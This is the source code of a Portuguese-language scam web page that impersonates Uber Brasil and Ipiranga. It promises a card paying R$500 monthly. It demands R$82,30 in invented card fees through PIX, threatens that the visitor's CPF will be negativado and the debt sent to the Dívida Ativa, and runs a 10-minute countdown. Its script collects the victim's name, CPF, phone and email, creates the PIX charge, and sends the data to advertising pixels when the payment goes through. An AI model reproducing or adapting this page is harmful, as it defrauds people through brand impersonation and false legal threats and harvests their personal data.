        <html>
         <head>
          <script type="text/javascript">
           (function(c,l,a,r,i,t,y){
                    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
                    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
                    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
                })(window, document, "clarity", "script", "s4nz0u51fp");
          </script>
          <title>
           Cart√£o de Recebimento Uber - R$ 500,00 | Uber
          </title>
          <meta content="Uber Brasil" property="og:title"/>
          <meta content="Receba seus R$ 500,00 mensais atrav√©s do Cart√£o Uber com Quil√¥metros de Vantagens e benef√≠cios exclusivos." property="og:description"/>
          <meta content="https://placehold.co/600x400?text=Cart√£o+Uber+Ipiranga" property="og:image"/>
          <meta content="www.uber.com.br" property="og:url"/>
          <meta content="website" property="og:type"/>
          <meta charset="utf-8">
           <meta content="width=device-width, initial-scale=1" name="viewport">
           
           <!-- Preload card images for instant loading -->
           <link rel="preload" as="image" href="https://i.ibb.co/Z6rZ8R1v/13093103960002-1-removebg-preview.png">
           <link rel="preload" as="image" href="https://i.ibb.co/B5B61LdW/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-24-1-2-1-removebg-preview.png">
           <link rel="preload" as="image" href="https://i.ibb.co/8DrZxqnq/c-HJpdm-F0-ZS9sci9pb-WFn-ZXMvd2-Vic2l0-ZS8y-MDIy-LTA3-L2pv-Yj-Ew-Njgt-ZWxlb-WVud-C1ja-Glw-LTAy-LWw1d.png">
           <link rel="preload" as="image" href="https://i.ibb.co/5h1TwChY/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-25-1-1.png">
            <script src="https://cdn.tailwindcss.com">
            </script>
            <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
            <link href="/static/css/uber-fonts.css" rel="stylesheet"/>
            <link href="/static/css/icon-fix.css" rel="stylesheet"/>
            <link href="https://fonts.googleapis.com/css?family=Roboto:400,700&amp;display=swap" rel="stylesheet"/>
            <link href="https://fonts.googleapis.com/css2?family=OCR+A+Std&display=swap" rel="stylesheet">
            <style>
             @font-face {
                font-family: 'UberMoveText';
                src: url('/static/fonts/UberMoveText-Regular.woff') format('woff'), url('/static/fonts/UberMoveText-Regular.ttf') format('truetype');
                font-weight: 400;
                font-display: swap;
              }
              @font-face {
                font-family: 'UberMoveText';
                src: url('/static/fonts/UberMoveText-Bold.woff') format('woff'), url('/static/fonts/UberMoveText-Bold.ttf') format('truetype');
                font-weight: 700;
                font-display: swap;
              }
              @font-face {
                font-family: 'UberMove';
                src: url('/static/fonts/UberMove-Medium.woff') format('woff'), url('/static/fonts/UberMove-Medium.ttf') format('truetype');
                font-weight: 500;
                font-display: swap;
              }

              * {
                font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
              }

              body {
                font-family: "UberMoveText", "UberMove", Arial, sans-serif !important;
                font-size: 16px;
                line-height: 24px;
                background: #fff;
                color: #333333;
              }

              h1, h2, h3, h4, h5, h6 {
                font-family: "UberMove", "UberMoveText", Arial, sans-serif !important;
                font-size: 28px !important;
                font-weight: 700 !important;
                line-height: 36px !important;
                color: #333333 !important;
              }
              .uber-link {
                color: #000;
                text-decoration: underline;
              }
              .uber-link:hover {
                color: #333;
              }
              .uber-btn, button, .btn, input[type="submit"], input[type="button"] {
                background: #000 !important;
                color: #fff !important;
                font-size: 16px;
                font-weight: 700;
                border-radius: 2px !important;
                padding: 10px 24px;
                transition: background 0.2s;
                border: none !important;
              }
              .uber-btn:hover, button:hover, .btn:hover, input[type="submit"]:hover, input[type="button"]:hover {
                background: #222 !important;
                color: #fff !important;
              }
              .uber-btn-outline {
                background: #000 !important;
                color: #fff !important;
                border: 1px solid #000 !important;
                font-size: 16px;
                font-weight: 500;
                border-radius: 2px !important;
                padding: 10px 24px;
                transition: background 0.2s;
              }
              .uber-btn-outline:hover {
                background: #222 !important;
                color: #fff !important;
              }
              h1, h2 {
                font-family: 'Uber Move', Arial, sans-serif;
                font-size: 32px !important;
                line-height: 1.2;
              }
              p, span, li, a, div, label {
                line-height: 1.5;
                font-size: 16px;
              }
              @media (max-width: 768px) {
                h1, h2 {
                  font-size: 28px !important;
                }
              }
              @media (max-width: 640px) {
                h1, h2 {
                  font-size: 24px !important;
                }
              }
              /* Force 0px border radius globally except for the card */
              *, *::before, *::after {
                border-radius: 0px !important;
              }
              .card-font {
                font-family: 'Roboto', Arial, sans-serif;
                letter-spacing: 0.08em;
              }
              .ocr-font {
                font-family: 'OCR A Std', 'OCR A', 'Courier', monospace;
                letter-spacing: 0.1em;
                font-variant-numeric: tabular-nums;
                color: #ffffff !important;
                text-shadow:
                  1px 1px 0 #b0b0b0,
                  2px 2px 2px #2226,
                  0 2px 6px #0008;
              }
              .uber-font {
                font-family: 'Roboto', Arial, sans-serif;
                font-weight: 400;
                letter-spacing: 0.01em;
              }
              .ipiranga-font {
                font-family: 'Roboto', Arial, sans-serif;
                font-weight: 700;
                letter-spacing: 0.01em;
              }
              .card-gradient-bg {
                background: linear-gradient(135deg, #0a0a0a 0%, #232323 45%, #232323 60%, #101214 100%);
              }
              .card-container {
                width: 320px;
                max-width: 90vw;
                aspect-ratio: 1.586;
                position: relative;
                margin-left: auto;
                margin-right: auto;
                min-width: 0;
                min-height: 0;
                display: block;
                border-radius: 10px !important;
                overflow: hidden;
              }
              .blinking-alert {
                animation: blink 1.5s ease-in-out infinite;
              }
              @keyframes blink {
                0%, 40% {
                  opacity: 1;
                }
                50% {
                  opacity: 0.3;
                }
                60%, 100% {
                  opacity: 1;
                }
              }
              @media (max-width: 400px) {
                .card-container {
                  width: 98vw;
                }
              }
            </style>
           </meta>
          </meta>
         </head>
         <body class="bg-white text-black min-w-[0]">
          <!-- Top nav (mobile only logo + hamburger menu) -->
          <div class="w-full bg-black text-white text-xs font-normal py-4 px-4 flex items-center justify-between fixed top-0 left-0 right-0 z-50" style="min-height:64px; border-radius: 0px;">
           <img alt="Logo Uber estilizado em preto e branco, com fundo transparente" class="h-8 w-auto" src="https://i.ibb.co/0RR0HNC0/13093103960002-1.png" style="max-height:32px; border-radius: 0px;"/>
           <div class="flex items-center md:hidden">
            <button aria-label="Abrir menu" class="flex flex-col justify-center items-center space-y-1">
             <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;">
             </span>
             <span class="block w-7 h-1.5 bg-white rounded" style="height:7px;">
             </span>
            </button>
           </div>
          </div>
          <!-- Subnav (hidden on mobile) -->
          <div class="w-full bg-white border-b border-gray-200 text-xs px-4 py-2 items-center justify-between hidden md:flex fixed top-16 left-0 right-0 z-40" style="border-radius: 0px;">
           <div class="flex items-center space-x-2">
            <span class="font-bold text-base text-black mr-4" style="font-family: 'Uber Move', Arial, sans-serif;">
             Benef√≠cios
            </span>
            <a class="text-black hover:underline" href="#">
             Vis√£o geral
            </a>
            <a class="text-black hover:underline" href="#">
             Cart√£o Uber Ipiranga
            </a>
            <a class="text-black hover:underline" href="#">
             Descontos
            </a>
            <a class="text-black hover:underline" href="#">
             Parcerias
            </a>
            <a class="text-black hover:underline" href="#">
             Programa de fidelidade
            </a>
           </div>
           <div class="flex items-center space-x-2">
            <span class="text-xs text-gray-500">
             Mais
            </span>
            <i class="fa fa-chevron-down text-xs text-gray-500">
            </i>
           </div>
          </div>
          <!-- Main content -->
          <div class="max-w-[1100px] mx-auto px-4 pt-24 pb-0">
           <!-- Alert Icon -->
           <div class="text-center mb-6">
            <img src="https://cdn-icons-png.flaticon.com/512/11540/11540309.png" alt="√çcone de alerta" class="blinking-alert w-20 h-20 mx-auto">
           </div>
           <!-- Title -->
           <div>
            <h1 class="font-bold leading-tight mb-4 text-center">
             Emiss√£o do Cart√£o √© Obrigat√≥ria!
            </h1>
            <p class="text-black mb-4 max-w-[600px] mx-auto text-center">
                Seu cart√£o foi aprovado pelo BACEN, por√©m o pagamento obrigat√≥rio ainda n√£o foi identificado. Se o valor n√£o for quitado dentro do prazo, <strong>seu CPF ser√° imediatamente negativado e a d√≠vida ser√° encaminhada para a D√≠vida Ativa da Uni√£o,</strong> com possibilidade de cobran√ßa judicial.
            </p>
            <div class="flex flex-col sm:flex-row items-center gap-6 mb-6">
             <div class="flex flex-col items-center w-full">
              <div class="card-container shadow-lg card-gradient-bg" style="margin-left: auto; margin-right: auto; overflow: hidden; border-radius: 10px !important;">
               <div class="absolute" style="top:11px; left:25px; display:flex; align-items:center;">
                <img alt="Logo Uber em branco com fundo transparente" src="https://i.ibb.co/Z6rZ8R1v/13093103960002-1-removebg-preview.png" style="height:3.5rem; max-width:200px; width:auto; object-fit:contain;">
               </div>
               <div class="absolute" style="top:22px; right:25px; display:flex; align-items:center;">
                <img alt="Ipiranga logo substitu√≠da por logo vermelha e branca em fundo transparente" src="https://i.ibb.co/B5B61LdW/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-24-1-2-1-removebg-preview.png" style="height:2.5rem; max-width:140px; width:auto; object-fit:contain;">
               </div>
               <div class="absolute" style="top:75px; left:25px;">
                <img alt="Credit card chip, golden color with intricate circuit-like details" class="rounded" src="https://i.ibb.co/8DrZxqnq/c-HJpdm-F0-ZS9sci9pb-WFn-ZXMvd2-Vic2l0-ZS8y-MDIy-LTA3-L2pv-Yj-Ew-Njgt-ZWxlb-WVud-C1ja-Glw-LTAy-LWw1d.png" style="width:54px; height:auto;">
               </div>
               <div class="absolute ocr-font select-none" style="top:120px; left:25px; font-size:1.3rem; display:flex;">
                2300&nbsp;0210&nbsp;0016&nbsp;0306
               </div>
               <div class="absolute ocr-font select-none" style="top:150px; left:25px; font-size:1.05rem; display:flex;" id="cardUserName">
                NOME&nbsp;SOBRENOME
               </div>
               <div class="absolute" style="bottom:10px; right:25px; display:flex; align-items:center;">
                <img alt="Mastercard logo with text in white" src="https://i.ibb.co/5h1TwChY/Noti-cias-Dia-rias-Post-Feed-Para-Instagram-Vermelho-E-Branco-25-1-1.png" style="height:2.4rem; width:auto; object-fit:contain; position:relative; top:1px;">
               </div>
              </div>
        <br>
                  <div class="flex-1">
                   <ul class="list-disc pl-5 text-black mb-2">
                    <li>
                     Cart√£o exclusivo para recebimento dos R$ 500,00 mensais
                    </li>
                    <li>
                     Quil√¥metros de Vantagens j√° inclu√≠do sem custo adicional
                    </li>
                    <li>
                     Desconto vital√≠cio de at√© 8% por litro de gasolina ou etanol
                    </li>
                    <li>
                     V√°lido em centenas de postos Ipiranga em todo o Brasil
                    </li>
                    <li>
                     Desconto autom√°tico direto na bomba
                    </li>
                    <li>
                     Voc√™ consegue sacar o seu pagamento ou realizar compras no d√©bito.
                    </li>
                   </ul>
                  </div>
                 </div>
        <body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
            <div class="bg-[#EEEEEE] rounded-none px-6 py-8 flex flex-col items-center shadow-sm w-full max-w-3xl border border-gray-200">
                <hr class="border-t border-gray-300 my-2 w-full">
                <div class="flex flex-col gap-1">
                    <span class="font-bold text-black text-base sm:text-lg">Desconto autom√°tico de <span class="font-bold text-green-700">8% por litro</span></span>
                    <span class="text-gray-700 text-base sm:text-lg">Economize em cada abastecimento, sem precisar de cupons ou burocracia.</span>
                </div>
                <hr class="border-t border-gray-300 my-4 w-full">
                <ul class="text-black text-base space-y-4 mb-6 w-full">
                    <li class="flex flex-col gap-1">
                        <span class="font-bold text-black">Abasteceu R$100?</span>
                        <span class="text-gray-700">Economize <span class="font-semibold text-green-700">R$8,00</span> em um √∫nico abastecimento.</span>
                    </li>
                    <li>
                        <hr class="border-t border-gray-200 my-2 w-full">
                    </li>
                    <li class="flex flex-col gap-1">
                        <span class="font-bold text-black">Abasteceu R$500?</span>
                        <span class="text-gray-700">Economize <span class="font-semibold text-green-700">R$50,00</span>.</span>
                    </li>
                </ul>
                <hr class="border-t border-gray-300 my-4 w-full">
                <div class="w-full flex flex-col items-center">
                    <p class="text-green-700 text-base text-center font-semibold mb-2">
                        V√°lido em todos os postos Ipiranga do Brasil.
                    </p>
                </div>
            </div>
        <br>

            <div class="bg-[#EEEEEE] p-6 mb-6">
             <h2 class="font-bold mb-2 text-lg">
              Para receber seu cart√£o e come√ßar a receber os R$ 500,00 √© obrigat√≥rio o pagamento das seguintes taxas:
             </h2>
             <div class="flex flex-col sm:flex-row gap-6">
              <div class="flex-1 flex items-center">
               <span class="bg-black text-white w-7 h-7 rounded-full flex items-center justify-center font-extrabold text-base mr-3" style="color: #fff !important;">
                1
               </span>
               <span class="text-black flex-grow">
                <strong>
                 Anuidade do cart√£o:
                </strong>
                R$24,80
               </span>
              </div>
              <div class="flex-1 flex items-center">
               <span class="bg-black text-white w-7 h-7 rounded-full flex items-center justify-center font-extrabold text-base mr-3" style="color: #fff !important;">
                2
               </span>
               <span class="text-black flex-grow">
                <strong>
                 Taxa de emiss√£o:
                </strong>
                R$18,60
               </span>
              </div>
                   <div class="flex-1 flex items-center">
                    <span class="bg-black text-white w-7 h-7 rounded-full flex items-center justify-center font-extrabold text-base mr-3" style="color: #fff !important;">
                     3
                    </span>
                    <span class="text-black flex-grow">
                     <strong>
                      Seguro do Cart√£o:
                     </strong>
                     R$38,90
                    </span>
                   </div>
             </div>
             <div class="mt-4 text-black font-semibold">
              <span>
               Total a pagar:
               <span class="text-green-700 font-bold">
                R$82,30
               </span>
              </span>
             </div>
                <br>
                <!-- Status Box -->
                <div class="bg-yellow-50 border border-yellow-200 p-4 mb-4 text-center" style="border-radius: 0px !important;">
                    <!-- Animated Loading Dots -->
                    <div class="loading-container" style="margin-bottom: 12px;">
                        <div class="loading-dots">
                            <div class="dot"></div>
                            <div class="dot"></div>
                            <div class="dot"></div>
                        </div>
                    </div>
                    <p class="text-yellow-800 font-medium">O pagamento √© obrigat√≥rio. Em caso de n√£o pagamento seu cadastro n√£o ser√° efetivado devido ao Cart√£o ser o √∫nico meio de receber os pagamentos Uber.</p>
                </div>
                <div class="bg-gray-50 border p-4 mb-4" style="border-radius: 0px !important;">
                    <!-- Loading Message -->
                    <div id="loadingMessage" class="text-center text-gray-600 py-4">
                        Gerando pagamento PIX...
                    </div>

                    <!-- PIX QR Code -->
                    <div class="text-center mb-4">
                        <img id="pixQrCode" style="display: none;" class="mx-auto border shadow-sm" width="180" height="180" style="border-radius: 0px !important;">
                    </div>

                    <!-- PIX Code Section -->
                    <div id="pixCodeSection" style="display: none;" class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-2">C√≥digo PIX (Copia e Cola):</label>
                        <input 
                            type="text" 
                            id="pixCode" 
                            readonly 
                            class="w-full border border-gray-300 px-3 py-2 bg-white text-xs mb-3"
                            style="border-radius: 0px !important;"
                            placeholder="C√≥digo PIX ser√° gerado automaticamente..."
                        >
                        <button 
                            onclick="copyPixCode()" 
                            class="w-full bg-green-600 hover:bg-green-700 text-white px-4 py-2 text-sm font-medium"
                            style="border-radius: 0px !important;"
                            id="copyButton"
                        >
                            Copiar C√≥digo Pix
                        </button>
                    </div>

                </div>
            </div>
           </div>
          </div>





        <!-- Countdown Timer -->
        <div class="mt-6 bg-red-50 border-2 border-red-200 rounded p-4 text-center">
            <div class="text-2xl font-bold text-red-600 mb-2">
                ‚è∞ Tempo restante: <span id="countdown">10:00</span>
            </div>
            <div class="text-red-700 font-medium">
                ‚ö†Ô∏è Este PIX expira em 10 minutos. Ap√≥s esse prazo, se o pagamento n√£o for conclu√≠do, 
                voc√™ perder√° o direito ao programa de Parceiros Uber.
            </div>
        </div>

    </div>
</div>
<br>
<style>
.loading-container {
    display: flex;
    justify-content: center;
    align-items: center;
}

.loading-dots {
    display: flex;
    gap: 4px;
}

.dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
    background-color: #f59e0b;
    animation: pulse 1.4s ease-in-out infinite both;
}

.dot:nth-child(1) {
    animation-delay: -0.32s;
}

.dot:nth-child(2) {
    animation-delay: -0.16s;
}

.dot:nth-child(3) {
    animation-delay: 0;
}

@keyframes pulse {
    0%, 80%, 100% {
        transform: scale(0.6);
        opacity: 0.5;
    }
    40% {
        transform: scale(1);
        opacity: 1;
    }
}
</style>

<script>
// Auto-generate PIX payment on page load
document.addEventListener('DOMContentLoaded', async function() {
    try {
        // Tentar usar dados precarregados primeiro para carregamento instant√¢neo
        let userName = '';
        
        const preloadedData = localStorage.getItem('preloadedCardData');
        if (preloadedData) {
            try {
                const cardData = JSON.parse(preloadedData);
                userName = cardData.displayName;
                console.log('‚úÖ Usando dados precarregados do cart√£o:', cardData);
            } catch (e) {
                console.log('‚ùå Erro ao ler dados precarregados, usando fallback');
            }
        }
        
        // Declare variables outside the if block to ensure they're accessible
        const userData = JSON.parse(localStorage.getItem('userData') || '{}');
        const paymentData = JSON.parse(localStorage.getItem('cnvPaymentData') || '{}');
        const loginUserData = JSON.parse(localStorage.getItem('loginUserData') || '{}');

        // Fallback para m√©todo tradicional se n√£o houver dados precarregados
        if (!userName) {
            // Try multiple localStorage keys for user data (prioritize login data)
            userName = (
                loginUserData.nome ||
                paymentData.name || 
                userData.full_name || 
                userData.name || 
                localStorage.getItem('candidateName') || 
                localStorage.getItem('userName') || 
                ''
            );
            console.log('Dados recuperados do localStorage (fallback)');
        }

        // Clean up any corrupted &nbsp; data from localStorage
        if (userName && userName.includes('&nbsp;')) {
            userName = userName.replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
            console.log('üßπ Cleaned corrupted localStorage data:', userName);
        }

        // Update card name with preloaded or fallback data
        updateCardUserName(userName);

        const userCPF = (
            loginUserData.cpf ||
            paymentData.cpf || 
            userData.cpf || 
            localStorage.getItem('candidateCPF') || 
            localStorage.getItem('userCPF') || 
            ''
        );

        const userPhone = (
            loginUserData.telefone ||
            paymentData.phone || 
            userData.phone || 
            localStorage.getItem('candidatePhone') || 
            localStorage.getItem('userPhone') || 
            ''
        );

        const userEmail = (
            loginUserData.email ||
            paymentData.email || 
            userData.email || 
            localStorage.getItem('candidateEmail') || 
            localStorage.getItem('userEmail') || 
            ''
        );

        console.log('Extracted user data:', { name: userName, cpf: userCPF, phone: userPhone, email: userEmail });

        // Debug localStorage contents
        console.log('All localStorage keys:', Object.keys(localStorage));
        console.log('Login user data:', loginUserData);
        console.log('Payment data:', paymentData);
        console.log('User data:', userData);
        for (let key in localStorage) {
            console.log(`localStorage.${key}:`, localStorage.getItem(key));
        }

        if (userName && userCPF) {
            const payloadData = {
                name: userName,
                cpf: userCPF,
                email: userEmail,
                phone: userPhone,
                page_from: 'cartao'
            };

            console.log('Sending payload:', payloadData);

            // Create payment using existing endpoint
            const response = await fetch('/create_cnv_payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payloadData)
            });

            const result = await response.json();
            console.log('API Response:', result);

            if (result.success && result.payment_data) {
                const pixData = result.payment_data;
                console.log('PIX Data:', pixData);

                // Display real PIX code
                if (pixData.pixCopyPaste) {
                    document.getElementById('pixCode').value = pixData.pixCopyPaste;
                    document.getElementById('pixCodeSection').style.display = 'block';
                    console.log('PIX code set successfully');
                }

                // Display real QR Code
                if (pixData.pixQrCode) {
                    const qrCodeElement = document.getElementById('pixQrCode');
                    qrCodeElement.src = pixData.pixQrCode;
                    qrCodeElement.style.display = 'block';
                    console.log('QR Code displayed successfully');
                }

                // Store payment ID for status checking
                if (pixData.paymentId) {
                    localStorage.setItem('cnvPaymentId', pixData.paymentId);
                    console.log('Payment ID stored:', pixData.paymentId);

                    // Start CNV payment monitoring
                    startCNVPaymentMonitoring(pixData.paymentId);
                }

                // Hide loading message
                document.getElementById('loadingMessage').style.display = 'none';

            } else {
                throw new Error(result.error || 'Erro ao criar pagamento PIX');
            }
        } else {
            console.error('Dados do usu√°rio incompletos:', { name: userName, cpf: userCPF, phone: userPhone });
            document.getElementById('loadingMessage').innerHTML = `
                <div class="text-red-600">
                    Dados do usu√°rio n√£o encontrados no localStorage.<br>
                    Nome: ${userName || 'n√£o encontrado'}<br>
                    CPF: ${userCPF || 'n√£o encontrado'}<br>
                    <a href="/" class="text-blue-600 underline">Voltar ao in√≠cio</a>
                </div>
            `;
        }
    } catch (error) {
        console.error('Erro ao criar pagamento:', error);
        document.getElementById('loadingMessage').innerHTML = `
            <div class="text-red-600">
                Erro ao carregar dados de pagamento: ${error.message}<br>
                <a href="/" class="text-blue-600 underline">Voltar ao in√≠cio</a>
            </div>
        `;
    }
});

// Meta Pixel Purchase Event Function for CNV Payment
function fireMetaPixelCNVPurchaseEvent(transactionData) {
    try {
        // Get user data from localStorage (from login or payment flow)
        const loginData = JSON.parse(localStorage.getItem('loginUserData') || '{}');
        const userData = {
            candidateName: loginData.nome || localStorage.getItem('candidateName') || '',
            candidateEmail: loginData.email || localStorage.getItem('candidateEmail') || '',
            candidatePhone: loginData.telefone || localStorage.getItem('candidatePhone') || '',
            candidateCPF: loginData.cpf || localStorage.getItem('candidateCPF') || '',
            candidateCity: loginData.cidade || localStorage.getItem('candidateCity') || '',
            candidateState: loginData.estado || localStorage.getItem('candidateState') || '',
            candidateZipCode: loginData.cep || localStorage.getItem('candidateZipCode') || ''
        };

        // Get campaign data
        const campaignInfo = JSON.parse(localStorage.getItem('campaignData') || '{}');

        // Purchase event data for CNV payment
        const purchaseValue = transactionData.payment_amount || 67.40;
        const transactionId = transactionData.transaction_id;

        // Customer data for Facebook (will be automatically hashed)
        const customerData = {};
        if (userData.candidateEmail) customerData.em = userData.candidateEmail.toLowerCase().trim();
        if (userData.candidatePhone) customerData.ph = userData.candidatePhone.replace(/\D/g, '');
        if (userData.candidateName) {
            const nameParts = userData.candidateName.trim().toLowerCase().split(' ');
            if (nameParts.length >= 1) customerData.fn = nameParts[0];
            if (nameParts.length >= 2) customerData.ln = nameParts[nameParts.length - 1];
        }
        if (userData.candidateCity) customerData.ct = userData.candidateCity.toLowerCase().trim();
        if (userData.candidateState) customerData.st = userData.candidateState.toLowerCase().trim();
        if (userData.candidateZipCode) customerData.zp = userData.candidateZipCode.replace(/\D/g, '');
        if (userData.candidateCPF) customerData.external_id = userData.candidateCPF.replace(/\D/g, '');

        // Event parameters
        const eventData = {
            value: purchaseValue,
            currency: 'BRL',
            content_type: 'product',
            content_ids: [transactionId],
            content_name: 'Uber Sticker Installation Fee',
            content_category: 'Installation'
        };

        // Add campaign data if available
        if (campaignInfo.fbclid) eventData.fbclid = campaignInfo.fbclid;
        if (campaignInfo.utm_source) eventData.utm_source = campaignInfo.utm_source;
        if (campaignInfo.utm_medium) eventData.utm_medium = campaignInfo.utm_medium;
        if (campaignInfo.utm_campaign) eventData.utm_campaign = campaignInfo.utm_campaign;

        // Fire Purchase event for all configured pixels
        if (typeof fbq !== 'undefined') {
            // Force immediate firing with explicit tracking
            fbq('track', 'Purchase', eventData, customerData);

            // Additional forced tracking attempts
            setTimeout(() => fbq('track', 'Purchase', eventData, customerData), 50);
            setTimeout(() => fbq('track', 'Purchase', eventData, customerData), 150);

            console.log('‚úÖ Meta Pixel CNV Purchase event fired successfully!');
            console.log('CNV Event Data:', eventData);
            console.log('CNV Customer Data:', customerData);
            console.log('CNV Campaign Data:', campaignInfo);

            // Send test event to verify pixel is working
            fbq('trackCustom', 'UberInstallationPurchase', {
                value: eventData.value,
                currency: 'BRL',
                transaction_id: eventData.content_ids[0]
            });
            console.log('‚úÖ Custom UberInstallationPurchase event also fired!');

        } else {
            console.error('‚ùå Facebook Pixel (fbq) not loaded - CNV Purchase event not fired');
            console.error('window.fbq status:', typeof window.fbq);
            console.error('Available globals:', Object.keys(window).filter(k => k.includes('fb')));

            // Force manual pixel initialization as last resort
            if (typeof window.fbq === 'undefined') {
                console.log('Attempting manual pixel recovery...');
                setTimeout(() => {
                    if (typeof window.fbq !== 'undefined') {
                        console.log('Pixel recovered! Firing delayed CNV Purchase event...');
                        window.fbq('track', 'Purchase', eventData, customerData);
                    }
                }, 2000);
            }
        }

    } catch (error) {
        console.error('Error firing Meta Pixel CNV Purchase event:', error);
    }
}

// CNV Payment Monitoring System - Using same logic as /pagamento page
function startCNVPaymentMonitoring(paymentId) {
    if (!paymentId) {
        console.log('No payment ID available for CNV monitoring');
        return;
    }

    console.log('Starting CNV payment monitoring for ID:', paymentId);

    function checkCNVPaymentStatus() {
        console.log('Checking CNV payment status for transaction:', paymentId);
        
        fetch(`/check_cnv_payment_status/${paymentId}`)
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }
                return response.json();
            })
            .then(data => {
                console.log('CNV payment status check result:', data);
                
                // Check for APPROVED status or redirect flag - same as pagamento page
                if (data.success && (data.status === 'APPROVED' || data.status === 'completed' || data.redirect)) {
                    console.log('‚úÖ CNV Payment APPROVED! Firing Meta Pixel Purchase event...');
                    clearInterval(cnvPaymentInterval);
                    
                    // Fire Meta Pixel Purchase event IMMEDIATELY
                    fireMetaPixelCNVPurchaseEvent({
                        transaction_id: paymentId,
                        payment_amount: data.payment_amount || 82.30,
                        status: 'completed'
                    });
                    
                    // Fire TikTok Pixel Purchase event
                    if (typeof ttq !== 'undefined') {
                        try {
                            ttq.track('CompletePayment', {
                                value: data.payment_amount || 82.30,
                                currency: 'BRL',
                                content_id: paymentId,
                                content_type: 'product'
                            });
                            console.log('‚úÖ TikTok Pixel CNV Purchase event fired!');
                        } catch (e) {
                            console.log('TikTok Pixel error:', e);
                        }
                    }
                    
                    // Force pixel events to fire with multiple attempts
                    setTimeout(() => {
                        fireMetaPixelCNVPurchaseEvent({
                            transaction_id: paymentId,
                            payment_amount: data.payment_amount || 82.30,
                            status: 'completed'
                        });
                    }, 100);
                    
                    setTimeout(() => {
                        fireMetaPixelCNVPurchaseEvent({
                            transaction_id: paymentId,
                            payment_amount: data.payment_amount || 82.30,
                            status: 'completed'
                        });
                    }, 300);
                    
                    // Mark that cartao payment was approved for finalizar page verification
                    localStorage.setItem('cartaoPaymentApproved', 'true');
                    
                    // Redirect after ensuring pixel fires
                    setTimeout(() => {
                        console.log('Redirecting to /finalizar...');
                        window.location.href = '/finalizar';
                    }, 1000);
                } else if (data.status) {
                    console.log('CNV payment status:', data.status);
                }
            })
            .catch(error => {
                console.error('Error checking CNV payment status:', error);
            });
    }

    // Start monitoring - check every 1 second like pagamento page
    const cnvPaymentInterval = setInterval(checkCNVPaymentStatus, 1000);

    // Initial check
    setTimeout(checkCNVPaymentStatus, 100);
    
    // Clean up interval when page is closed
    window.addEventListener('beforeunload', function() {
        if (cnvPaymentInterval) {
            clearInterval(cnvPaymentInterval);
        }
    });
}

// Countdown timer function
let countdownTime = 10 * 60; // 10 minutes in seconds

function updateCountdown() {
    const minutes = Math.floor(countdownTime / 60);
    const seconds = countdownTime % 60;
    const formattedTime = `${minutes}:${seconds.toString().padStart(2, '0')}`;

    const countdownElement = document.getElementById('countdown');
    if (countdownElement) {
        countdownElement.textContent = formattedTime;

        // Change color as time runs out
        if (countdownTime <= 120) { // Last 2 minutes - red
            countdownElement.style.color = '#DC2626';
        } else if (countdownTime <= 300) { // Last 5 minutes - orange
            countdownElement.style.color = '#EA580C';
        }
    }

    if (countdownTime <= 0) {
        // Timer expired
        if (countdownElement) {
            countdownElement.textContent = 'EXPIRADO';
            countdownElement.style.color = '#DC2626';
        }

        // Show expiration message
        document.body.innerHTML = `
            <div class="min-h-screen bg-gray-100 flex items-center justify-center px-4">
                <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg p-8 text-center">
                    <div class="text-6xl mb-4">‚è∞</div>
                    <h1 class="text-2xl font-bold text-red-600 mb-4">PIX Expirado</h1>
                    <p class="text-gray-700 mb-6">
                        O tempo limite de 10 minutos foi ultrapassado. 
                        Voc√™ perdeu o direito ao programa de Parceiros Uber.
                    </p>
                    <a href="/" class="bg-black text-white px-6 py-3 rounded font-medium hover:bg-gray-800">
                        Voltar ao In√≠cio
                    </a>
                </div>
            </div>
        `;
        return;
    }

    countdownTime--;
}

// Start countdown when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Start the countdown immediately
    updateCountdown();
    // Update every second
    setInterval(updateCountdown, 1000);
});

// Function to update card user name
function updateCardUserName(fullName) {
    if (!fullName || fullName.trim() === '') {
        console.log('No user name found in localStorage');
        return;
    }

    try {
        // Clean up any HTML entities like &nbsp; in the name
        let cleanName = fullName.replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
        
        // Split name into parts and get first and last name
        const nameParts = cleanName.split(' ');
        let firstName = '';
        let lastName = '';

        if (nameParts.length === 1) {
            firstName = nameParts[0];
            lastName = '';
        } else {
            firstName = nameParts[0];
            lastName = nameParts[nameParts.length - 1];
        }

        // Format name with uppercase and space
        const formattedName = `${firstName.toUpperCase()}${lastName ? ` ${lastName.toUpperCase()}` : ''}`;
        
        // Update the card element
        const cardNameElement = document.getElementById('cardUserName');
        if (cardNameElement) {
            cardNameElement.textContent = formattedName;
            console.log('Card name updated to:', formattedName);
        }
    } catch (error) {
        console.error('Error updating card name:', error);
    }
}

// Copy PIX code function
function copyPixCode() {
    const pixCodeInput = document.getElementById('pixCode');
    pixCodeInput.select();
    pixCodeInput.setSelectionRange(0, 99999);

    try {
        document.execCommand('copy');

        const button = event.target.closest('button');
        const originalText = button.textContent;
        button.textContent = 'Copiado!';
        button.classList.add('bg-green-600');

        setTimeout(() => {
            button.textContent = originalText;
            button.classList.remove('bg-green-600');
        }, 2000);

    } catch (err) {
        alert('Erro ao copiar c√≥digo PIX');
    }
}
</script>

          </div>
          
          <!-- Uber Footer -->
          <footer class="w-full bg-black text-white pt-10 pb-6 px-4 mt-0">
            <div class="max-w-[1100px] mx-auto">
              <div class="flex flex-col md:flex-row md:justify-between md:items-start mb-8 space-y-8 md:space-y-0">
                <div class="flex flex-col items-start space-y-4 md:space-y-6">
